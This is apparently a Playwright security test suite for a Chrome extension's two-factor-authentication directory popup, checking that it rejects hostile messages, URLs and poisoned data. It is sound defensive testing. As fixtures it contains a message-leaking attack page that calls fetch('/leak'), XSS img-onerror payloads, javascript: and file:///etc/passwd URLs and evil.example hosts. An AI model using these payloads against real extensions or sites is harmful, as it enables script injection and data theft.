import { test, expect, chromium } from '@playwright/test';
import { cpSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
import { createServer } from 'http';
import { tmpdir } from 'os';
import path from 'path';
import { isDomain, isHttpsUrl, isMethodList } from '../scripts/site-validation.js';

// Without this, Playwright doesn't report requests made by the service worker.
process.env.PW_EXPERIMENTAL_SERVICE_WORKER_NETWORK_EVENTS = '1';

const DIST = path.resolve('dist');
const SETTLE_MS = 200;
const settle = (ms = SETTLE_MS) => new Promise(resolve => setTimeout(resolve, ms));

async function launchExtension(extensionPath) {
    const context = await chromium.launchPersistentContext('', {
        headless: false,
        args: [
            `--disable-extensions-except=${extensionPath}`,
            `--load-extension=${extensionPath}`,
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-gpu',
            '--disable-dev-shm-usage',
            '--disable-software-rasterizer',
        ],
    });
    const worker = context.serviceWorkers()[0] || await context.waitForEvent('serviceworker');
    return { context, worker, extensionId: new URL(worker.url()).host };
}

// Opens the popup with chrome.tabs.create replaced by a recorder, so a test can
// see exactly which links the wrapper agreed to open.
async function openPopup(context, extensionId) {
    const page = await context.newPage();
    await page.goto(`chrome-extension://${extensionId}/popup/index.html`);
    await page.frameLocator('#sandbox-frame').locator('#app > *').first().waitFor();
    const frame = page.frames().find(f => f.url().endsWith('/popup/ui.html'));
    await page.evaluate(() => {
        window.__opened = [];
        chrome.tabs.create = ({ url }) => {
            window.__opened.push(url);
            return Promise.resolve({});
        };
    });
    return { page, frame };
}

// Adds a sandboxed frame that is not ours, with the same opaque origin as the UI.
async function addForeignFrame(page, owner, name) {
    await owner.evaluate((frameName) => {
        const iframe = document.createElement('iframe');
        iframe.name = frameName;
        iframe.setAttribute('sandbox', 'allow-scripts');
        iframe.srcdoc = '<p>foreign</p>';
        document.body.append(iframe);
    }, name);
    await settle();
    return page.frames().find(f => f.name() === name);
}

test.describe('Security', () => {
    let context;
    let worker;
    let extensionId;
    let server;
    let serverUrl;
    let serverLog;
    let page;
    let frame;

    const sendFromUi = async (message, from = frame) => {
        await from.evaluate(m => window.parent.postMessage(m, '*'), message);
        await settle();
    };
    const sendToUi = async (message) => {
        await page.evaluate(m => document.getElementById('sandbox-frame').contentWindow.postMessage(m, '*'), message);
        await settle();
    };
    const opened = () => page.evaluate(() => window.__opened.slice());
    const storedTips = async () => (await worker.evaluate(() => chrome.storage.local.get('doneTips'))).doneTips;

    test.beforeAll(async () => {
        const attackPage = `<!doctype html><script>
            addEventListener('message', e => fetch('/leak?d=' + encodeURIComponent(JSON.stringify(e.data)), { mode: 'no-cors' }));
            fetch('/alive', { mode: 'no-cors' });
            parent.postMessage({ type: 'GET_TAB_URL' }, '*');
            parent.postMessage({ type: 'OPEN_URL', url: 'https://leak.example/' }, '*');
            parent.postMessage({ type: 'SAVE_TIPS', ids: ['tip-privacy'] }, '*');
        </script>`;
        serverLog = [];
        server = createServer((req, res) => {
            serverLog.push(req.url);
            const headers = { 'content-type': 'text/html' };
            if (req.url.startsWith('/evil-sandboxed')) headers['content-security-policy'] = 'sandbox allow-scripts';
            res.writeHead(200, headers);
            res.end(req.url.startsWith('/evil') ? attackPage : '<p>page</p>');
        });
        await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
        serverUrl = `http://127.0.0.1:${server.address().port}`;

        ({ context, worker, extensionId } = await launchExtension(DIST));
    });

    test.afterAll(async () => {
        await Promise.race([context?.close(), settle(5000)]);
        server?.close();
    });

    test.beforeEach(async () => {
        await worker.evaluate(() => chrome.storage.local.clear());
        ({ page, frame } = await openPopup(context, extensionId));
    });

    test.afterEach(async () => {
        await page?.close().catch(() => {});
    });

    test.describe('Message bridge', () => {
        test('opens https links asked for by the UI', async () => {
            await sendFromUi({ type: 'OPEN_URL', url: 'https://example.com/' });
            expect(await opened()).toEqual(['https://example.com/']);
        });

        test('refuses to open anything other than https', async () => {
            const urls = [
                'http://evil.example/',
                'javascript:alert(1)',
                'data:text/html,x',
                'file:///etc/passwd',
                'chrome://settings',
                `chrome-extension://${extensionId}/popup/ui.html`,
                ' https://evil.example/',
                'about:blank',
                ['https://evil.example/'],
                null,
                42,
            ];
            for (const url of urls) await sendFromUi({ type: 'OPEN_URL', url });
            expect(await opened()).toEqual([]);
        });

        test('saves real tip IDs without duplicates', async () => {
            await sendFromUi({ type: 'SAVE_TIPS', ids: ['tip-privacy', 'tip-privacy'] });
            expect(await storedTips()).toEqual(['tip-privacy']);
        });

        test('rejects tip lists that are not real tip IDs', async () => {
            const lists = [
                ['evil'],
                ['tip-privacy', 'evil'],
                Array(13).fill('tip-privacy'),
                [1],
                [null],
                'tip-privacy',
                { length: 1, 0: 'tip-privacy' },
                ['__proto__'],
            ];
            for (const ids of lists) await sendFromUi({ type: 'SAVE_TIPS', ids });
            expect(await storedTips()).toBeUndefined();
        });

        test('filters corrupt saved tips when reading them back', async () => {
            await frame.evaluate(() => {
                window.__tips = [];
                addEventListener('message', e => {
                    if (e.data?.type === 'TIPS_DATA') window.__tips.push(e.data.ids);
                });
            });
            await worker.evaluate(() => chrome.storage.local.set({ doneTips: ['evil', 5, 'tip-privacy', 'tip-privacy'] }));
            await sendFromUi({ type: 'GET_TIPS' });
            expect(await frame.evaluate(() => window.__tips)).toEqual([['tip-privacy']]);
        });

        test('survives malformed messages', async () => {
            const errors = [];
            page.on('pageerror', e => errors.push(String(e)));
            const messages = [null, 1, 'x', [], {}, { type: null }, { type: {} }, { type: 'OPEN_URL' }, { type: 'SAVE_TIPS' }];
            for (const message of messages) await sendFromUi(message);
            await sendFromUi({ type: 'SAVE_TIPS', ids: ['tip-privacy'] });
            expect(errors).toEqual([]);
            expect(await storedTips()).toEqual(['tip-privacy']);
        });

        test('ignores other frames with the same opaque origin', async () => {
            const sibling = await addForeignFrame(page, page, 'sibling');
            await sendFromUi({ type: 'OPEN_URL', url: 'https://foreign.example/' }, sibling);
            await sendFromUi({ type: 'SAVE_TIPS', ids: ['tip-privacy'] }, sibling);
            expect(await opened()).toEqual([]);
            expect(await storedTips()).toBeUndefined();
        });

        test('ignores the wrapper page posting to itself', async () => {
            await page.evaluate(() => {
                window.postMessage({ type: 'OPEN_URL', url: 'https://self.example/' }, '*');
                window.postMessage({ type: 'SAVE_TIPS', ids: ['tip-privacy'] }, '*');
            });
            await settle();
            expect(await opened()).toEqual([]);
            expect(await storedTips()).toBeUndefined();
        });

        test('the UI only believes tab addresses from its wrapper', async () => {
            const ui = page.frameLocator('#sandbox-frame').locator('body');
            const sibling = await addForeignFrame(page, page, 'sibling');
            await sibling.evaluate(() => parent.frames[0].postMessage({ type: 'TAB_URL', url: 'https://github.com/' }, '*'));
            await settle();
            await expect(ui).not.toContainText('github.com');

            await sendToUi({ type: 'TAB_URL', url: 'https://github.com/' });
            await expect(ui).toContainText('github.com');
        });

        test('treats hostile tab addresses as inert', async () => {
            const urls = ['javascript:alert(1)', 'https://<img src=x onerror=window.__pwn=1>/', 'data:text/html,x', null, 5, {}];
            for (const url of urls) await sendToUi({ type: 'TAB_URL', url });
            expect(await frame.evaluate(() => ({ pwn: window.__pwn, images: document.querySelectorAll('img').length })))
                .toEqual({ images: 0 });
        });
    });

    test.describe('Frame navigation', () => {
        for (const route of ['evil-plain', 'evil-sandboxed']) {
            test(`a page cannot replace the UI: ${route}`, async () => {
                serverLog.length = 0;
                await frame.evaluate(url => { location.href = url; }, `${serverUrl}/${route}`).catch(() => {});
                await settle(800);

                expect(serverLog).toEqual([]);
                expect(await opened()).toEqual([]);
                expect(await storedTips()).toBeUndefined();
            });
        }

        test('every link click goes through the wrapper', async () => {
            const link = frame.locator('a[href^="https://nickcotterill"]').first();
            const pagesBefore = context.pages().length;

            await link.click();
            await link.click({ button: 'middle' });
            await settle();

            expect(await opened()).toEqual(['https://nickcotterill.co.uk', 'https://nickcotterill.co.uk']);
            expect(context.pages().length).toBe(pagesBefore);
            expect(frame.url()).toMatch(/\/popup\/ui\.html$/);
        });
    });

    test.describe('Web page isolation', () => {
        test('a website cannot read or embed the extension', async () => {
            const site = await context.newPage();
            await site.goto(`${serverUrl}/page`);

            const reachable = await site.evaluate(async (id) => {
                const paths = ['manifest.json', 'popup/ui.html', 'popup/index.html', '2fa.directory/sites.json'];
                const results = await Promise.all(paths.map(p =>
                    fetch(`chrome-extension://${id}/${p}`).then(() => p).catch(() => null)
                ));
                return results.filter(Boolean);
            }, extensionId);
            expect(reachable).toEqual([]);

            await site.evaluate((id) => {
                const iframe = document.createElement('iframe');
                iframe.src = `chrome-extension://${id}/popup/index.html`;
                document.body.append(iframe);
            }, extensionId);
            await settle(400);
            const embedded = site.frames().find(f => f.url().includes(extensionId));
            if (embedded) {
                expect(await embedded.evaluate(() => document.getElementById('sandbox-frame'))).toBeNull();
            }

            await site.close();
        });
    });

    test.describe('Privacy', () => {
        test('tab addresses are not sent, logged or stored', async () => {
            const token = 'PRIVATE-ADDRESS-TOKEN';
            const requests = [];
            const logs = [];
            const onRequest = request => requests.push(request.url());
            const onConsole = message => logs.push(message.text());
            context.on('request', onRequest);
            context.on('console', onConsole);

            const visited = `${serverUrl}/page?t=${token}`;
            const site = await context.newPage();
            await site.goto(visited);
            await settle(500);

            const popup = await openPopup(context, extensionId);
            await popup.frame.evaluate(() => document.querySelectorAll('[role=tab]').forEach(tab => tab.click()));
            await site.bringToFront();
            await settle(500);

            // Proves worker traffic is being captured, so an empty result means something.
            const control = `${serverUrl}/worker-control`;
            await worker.evaluate(url => fetch(url, { mode: 'no-cors' }).catch(() => {}), control);
            await settle(300);

            context.off('request', onRequest);
            context.off('console', onConsole);

            expect(requests).toContain(control);
            const external = requests.filter(url =>
                !url.startsWith('chrome-extension://') && url !== visited && url !== control && !url.endsWith('/favicon.ico'));
            expect(external).toEqual([]);
            expect(logs.join('\n')).not.toContain(token);
            expect(JSON.stringify(await worker.evaluate(() => chrome.storage.local.get(null)))).not.toContain(token);

            await popup.page.close();
            await site.close();
        });
    });
});

test.describe('Security: poisoned directory data', () => {
    let context;
    let extensionId;
    let page;
    let frame;
    let tempDir;

    const inspectUi = () => frame.evaluate(() => ({
        pwned: window.__pwn ?? null,
        images: document.querySelectorAll('img').length,
        unsafeLinks: [...document.querySelectorAll('a[href]')]
            .map(a => a.getAttribute('href'))
            .filter(href => !href.startsWith('https://')),
    }));
    const safeUi = { pwned: null, images: 0, unsafeLinks: [] };

    test.beforeAll(async () => {
        tempDir = mkdtempSync(path.join(tmpdir(), '2step-poisoned-'));
        cpSync(DIST, tempDir, { recursive: true });

        // The popup's data is bundled, so hostile entries are spliced into the
        // build rather than into sites.json.
        const bundlePath = path.join(tempDir, 'popup/ui-logic.js');
        const bundle = readFileSync(bundlePath, 'utf8');
        const anchor = '"github.com":{';
        expect(bundle).toContain(anchor);
        writeFileSync(bundlePath, bundle.replace(anchor, [
            '"<img src=x onerror=window.__pwn=1>.evil.com":{methods:["<img src=x onerror=window.__pwn=2>"],documentation:"javascript:window.__pwn=3"},',
            '"script.evil.com":{methods:["totp"],documentation:"javascript:window.__pwn=4"},',
            '"plain.evil.com":{methods:["totp"],documentation:"http://evil.example/"},',
            anchor,
        ].join('')));

        ({ context, extensionId } = await launchExtension(tempDir));
        ({ page, frame } = await openPopup(context, extensionId));
    });

    test.afterAll(async () => {
        await Promise.race([context?.close(), settle(5000)]);
        rmSync(tempDir, { recursive: true, force: true });
    });

    test('hostile entries render as plain text', async () => {
        const ui = page.frameLocator('#sandbox-frame');
        await ui.getByRole('tab', { name: 'Directory' }).click();
        await ui.locator('input').first().fill('evil.com');
        await expect(ui.locator('body')).toContainText('<img src=x onerror=window.__pwn=1>.evil.com');
        expect(await inspectUi()).toEqual(safeUi);

        await ui.getByText('<img src=x onerror=window.__pwn=1>.evil.com').first().click();
        await settle();
        expect(await inspectUi()).toEqual(safeUi);
    });

    for (const host of ['script.evil.com', 'plain.evil.com']) {
        test(`no setup guide is offered for ${host}`, async () => {
            const ui = page.frameLocator('#sandbox-frame');
            await ui.getByRole('tab', { name: 'Current' }).click();
            await page.evaluate(url => document.getElementById('sandbox-frame').contentWindow.postMessage({ type: 'TAB_URL', url }, '*'), `https://${host}/`);
            await expect(ui.locator('body')).toContainText(host);
            await expect(ui.getByText('Open Setup Guide')).toHaveCount(0);
            expect(await inspectUi()).toEqual(safeUi);
        });
    }
});

test.describe('Security: directory import validation', () => {
    test('only plain https links are kept', () => {
        expect(isHttpsUrl('https://example.com/2fa')).toBe(true);
        expect(isHttpsUrl('HTTPS://example.com/')).toBe(true);

        const rejected = [
            'http://example.com/',
            'javascript:alert(1)',
            'data:text/html,x',
            ' https://example.com/',
            'https://',
            'https://user@evil.example/',
            'https://user:pw@evil.example/',
            'https://bank.com@evil.example/',
            null,
            undefined,
            {},
            ['https://example.com/'],
        ];
        for (const value of rejected) expect(isHttpsUrl(value), String(value)).toBe(false);
    });

    test('only well-formed domains are kept', () => {
        expect(isDomain('example.com')).toBe(true);
        expect(isDomain('login.cloud.example.co.uk')).toBe(true);

        const rejected = ['__proto__', 'constructor', 'localhost', 'UPPER.example', '<img src=x>.example', 'a b.com', '', 12345, null];
        for (const value of rejected) expect(isDomain(value), String(value)).toBe(false);
    });

    test('only known-shaped method lists are kept', () => {
        expect(isMethodList(['totp', 'custom-hardware'])).toBe(true);

        const rejected = ['totp', ['<img src=x>'], ['TOTP'], [1], [null], {}, null];
        for (const value of rejected) expect(isMethodList(value), String(value)).toBe(false);
    });
});
